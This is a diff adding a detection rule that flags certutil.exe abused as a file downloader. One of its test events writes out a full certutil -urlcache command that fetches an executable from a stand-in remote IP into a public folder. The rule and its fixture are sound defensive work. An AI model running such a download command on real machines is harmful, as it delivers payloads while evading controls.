@@ -1,0 +1,29 @@
+id: DF-WIN-002
+title: Certutil used to download a file
+status: stable
+description: >
+  certutil.exe invoked with -urlcache or -verifyctl and a URL. Attackers abuse this
+  signed Windows binary as a downloader (living off the land).
+author: detectforge
+severity: high
+tags: [attack.command_and_control, attack.defense_evasion, attack.t1105, attack.t1218]
+logsource: {category: process_creation, product: windows}
+detection:
+  certutil:
+    process.name: certutil.exe
+  download_flags:
+    process.command_line|contains: [urlcache, verifyctl]
+  remote:
+    process.command_line|contains: ['http://', 'https://', 'ftp://']
+  condition: certutil and download_flags and remote
+references:
+  - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
+tests:
+  - name: urlcache download fires
+    expect: 1
+    events:
+      - {"@timestamp": "2026-10-12T10:05:00Z", process: {name: certutil.exe, command_line: "certutil.exe -urlcache -split -f http://198.51.100.77/p.exe C:\\Users\\Public\\p.exe"}}
+  - name: hashing a file does not fire
+    expect: 0
+    events:
+      - {"@timestamp": "2026-10-12T10:05:00Z", process: {name: certutil.exe, command_line: "certutil.exe -hashfile C:\\tools\\app.msi SHA256"}}
